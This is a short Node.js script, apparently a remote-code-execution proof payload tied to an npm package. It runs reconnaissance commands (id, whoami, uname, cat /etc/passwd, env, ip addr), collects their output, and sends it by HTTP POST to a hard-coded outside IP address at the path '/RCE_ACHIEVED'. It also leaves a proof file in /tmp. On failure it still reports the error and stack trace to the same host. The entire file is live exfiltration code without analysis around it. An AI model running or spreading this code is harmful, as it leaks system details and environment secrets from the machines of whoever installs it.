const { execSync } = require('child_process');
const https = require('https');
const http = require('http');

try {
  // Execute system commands
  const id = execSync('id 2>&1').toString().trim();
  const hostname = execSync('hostname 2>&1').toString().trim();
  const uname = execSync('uname -a 2>&1').toString().trim();
  const whoami = execSync('whoami 2>&1').toString().trim();
  const passwd = execSync('cat /etc/passwd 2>/dev/null | head -10').toString().trim();
  const env = execSync('env 2>&1 | head -30').toString().trim();
  const ifconfig = execSync('ip addr 2>/dev/null || ifconfig 2>/dev/null').toString().trim();
  
  const data = JSON.stringify({
    rce: true,
    id, hostname, uname, whoami, 
    passwd: passwd.substring(0, 500),
    env: env.substring(0, 1000),
    ifconfig: ifconfig.substring(0, 500),
    timestamp: new Date().toISOString()
  });
  
  // Callback to VPS
  const req = http.request({
    hostname: '198.199.79.190',
    port: 4452,
    path: '/RCE_ACHIEVED',
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'Content-Length': data.length}
  }, (res) => {});
  req.write(data);
  req.end();
  
  // Also write proof to /tmp
  const fs = require('fs');
  fs.writeFileSync('/tmp/rce_proof_npm.txt', `RCE ACHIEVED\n${id}\n${hostname}\n${uname}\n`);
} catch(e) {
  // Still callback with error
  const http2 = require('http');
  const req = http2.request({
    hostname: '198.199.79.190', port: 4452, path: '/error',
    method: 'POST',
    headers: {'Content-Type': 'application/json'}
  });
  req.write(JSON.stringify({error: e.message, stack: e.stack}));
  req.end();
}
